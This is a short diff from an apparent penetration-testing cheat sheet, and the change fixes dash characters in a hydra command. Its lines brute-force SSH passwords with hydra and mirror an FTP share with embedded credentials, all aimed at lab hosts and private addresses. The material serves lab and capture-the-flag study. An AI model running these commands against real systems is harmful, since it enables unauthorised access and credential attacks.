@@ -80,7 +80,7 @@ wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally.htb.local'
 ## 22: Ssh
 ### Hydra
     # hydra -l root -e nsr -V -o hydra.log -t8 -f ssh://raven.local
-    hydra –l (found_name) –P password.lst 192.168.168.168 ssh
+    hydra -l (found_name) -P password.lst 192.168.168.168 ssh
     hydra -L username_list.txt -P password_list.txt 192.168.168.168 ssh -t 4
 =============================================================
 ## 23: Telnet
